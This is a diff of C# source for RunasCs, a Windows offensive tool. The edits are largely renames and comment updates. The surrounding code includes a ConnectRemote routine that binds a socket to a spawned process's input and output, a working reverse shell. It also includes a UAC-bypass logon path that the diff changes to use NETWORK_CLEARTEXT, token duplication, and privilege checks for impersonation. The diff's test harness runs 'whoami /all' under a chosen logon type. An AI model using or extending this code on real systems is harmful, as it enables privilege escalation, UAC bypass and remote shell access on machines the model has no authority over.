@@ -18,9 +18,9 @@ public class RunasCsException : Exception
 
 public class RunasCs
 {
-    private const UInt16 SW_HIDE = 0;
     private const Int32 Startf_UseStdHandles = 0x00000100;
-    private const int TokenType = 1; //primary token
+    private const int TokenPrimary = 1;
+    private const int TokenImpersonation = 2;
     private const int LOGON32_PROVIDER_DEFAULT = 0; 
     private const int LOGON32_PROVIDER_WINNT50 = 3;
     private const int LOGON32_LOGON_INTERACTIVE = 2;
@@ -172,10 +172,8 @@ public class RunasCs
     [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
     private static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
 
-
     [DllImport("advapi32.dll", SetLastError = true)]
     private static extern uint SetSecurityInfo(IntPtr handle, SE_OBJECT_TYPE ObjectType, uint SecurityInfo, IntPtr psidOwner, IntPtr psidGroup, IntPtr pDacl, IntPtr pSacl);
-
 
     [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
@@ -252,7 +250,7 @@ public class RunasCs
         return output;
     }
 
-    private static IntPtr connectRemote(string[] remote)
+    private static IntPtr ConnectRemote(string[] remote)
     {
         int port = 0;
         int error = 0;
@@ -304,7 +302,7 @@ public class RunasCs
         return count;
     }
 
-    private static bool getUserEnvironmentBlock(IntPtr hToken, out IntPtr lpEnvironment, out string warning)
+    private static bool GetUserEnvironmentBlock(IntPtr hToken, out IntPtr lpEnvironment, out string warning)
     {
         bool success;
         warning = "";
@@ -387,11 +385,11 @@ public class RunasCs
     private bool CreateProcessWithLogonWUacBypass(int logonType, string username, string domainName, string password, string processPath, string commandLine, ref STARTUPINFO startupInfo, out ProcessInformation processInfo) {
         bool result = false;
         IntPtr hToken = new IntPtr(0);
-        // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with Network
+        // the below logon types are not filtered by UAC, we allow login with them. Otherwise stick with NetworkCleartext
         if (logonType == LOGON32_LOGON_NETWORK || logonType == LOGON32_LOGON_BATCH || logonType == LOGON32_LOGON_SERVICE || logonType == LOGON32_LOGON_NETWORK_CLEARTEXT)
             result = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
         else
-            result = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, ref hToken);
+            result = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK_CLEARTEXT, LOGON32_PROVIDER_DEFAULT, ref hToken);
         if (result == false)
             throw new RunasCsException("CreateProcessWithLogonWUacBypass: Wrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error());
 
@@ -477,7 +475,7 @@ public class RunasCs
             commandLine = "/c " + cmd;
 
         } else if( remote != null ) {
-            this.socket = connectRemote(remote);
+            this.socket = ConnectRemote(remote);
             startupInfo.dwFlags = Startf_UseStdHandles;
             startupInfo.hStdInput = this.socket;
             startupInfo.hStdOutput = this.socket;
@@ -544,7 +542,7 @@ public class RunasCs
             sa.bInheritHandle       = true;
             sa.Length               = Marshal.SizeOf(sa);
             sa.lpSecurityDescriptor = (IntPtr)0;
-            success = DuplicateTokenEx(hToken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenType, ref hTokenDuplicate);
+            success = DuplicateTokenEx(hToken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenPrimary, ref hTokenDuplicate);
             if(success == false)
                 throw new RunasCsException("DuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error());
 
@@ -571,7 +569,7 @@ public class RunasCs
                 string warning;
                 IntPtr lpEnvironment;
                 // obtain environmentBlock for desired user
-                success = getUserEnvironmentBlock(hTokenDuplicate, out lpEnvironment, out warning);
+                success = GetUserEnvironmentBlock(hTokenDuplicate, out lpEnvironment, out warning);
                 if (success == false)
                 {
                     //Console.Out.WriteLine(warning); // this is a debug message
@@ -1398,7 +1396,7 @@ public static class AccessToken{
         return output;
     }
 
-    public static List<string[]> getTokenPrivileges(IntPtr tHandle){
+    public static List<string[]> GetTokenPrivileges(IntPtr tHandle){
         List<string[]> privileges = new List<string[]>();
         uint TokenInfLength=0;
         bool Result; 
@@ -1448,8 +1446,7 @@ public static class AccessToken{
                 filtered = true;
         }
         Marshal.FreeHGlobal(tokenElevationPtr);
-
-        // second iteration of token checks
+        // second iteration of token checks. Check differences between Interactive and Network logon types. If IL mismatch, UAC applied some restrictions
         if (filtered) {
             Result = LogonUser(username, domainName, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref hTokenInteractive);
             Result2 = LogonUser(username, domainName, password, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, ref hTokenNetwork);
@@ -1462,6 +1459,7 @@ public static class AccessToken{
                 CloseHandle(hTokenNetwork);
             }
             else {
+                // in some edge cases we can land here, check the UAC registry key as a last desperate attempt
                 Int32 uacEnabled = (Int32)Registry.GetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", null);
                 if (uacEnabled == 1)
                     filtered = true;
@@ -1469,7 +1467,6 @@ public static class AccessToken{
                     filtered = false;
             }
         }
-
         return filtered;
     }
 
@@ -1727,7 +1724,7 @@ Examples:
         IntPtr currentTokenHandle = WindowsIdentity.GetCurrent().Token;        
 
         List<string[]> privs = new List<string[]>();
-        privs = AccessToken.getTokenPrivileges(currentTokenHandle);
+        privs = AccessToken.GetTokenPrivileges(currentTokenHandle);
 
         bool SeAssignPrimaryTokenPrivilegeAssigned = false;
         bool SeImpersonatePrivilegeAssigned = false;
@@ -1852,10 +1849,10 @@ class MainClass
         argsTest[2] = "whoami /all";
         //argsTest[2] = "ping -n 30 127.0.0.1";
         argsTest[3] = "--function";
-        argsTest[4] = "1";
+        argsTest[4] = "0";
         argsTest[5] = "--logon-type";
-        argsTest[6] = "2";
-        argsTest[7] = "--bypass-uac";
+        argsTest[6] = "8";
+        //argsTest[7] = "--bypass-uac";
         Console.Out.Write(RunasCsMainClass.RunasCsMain(argsTest));
     }
 }
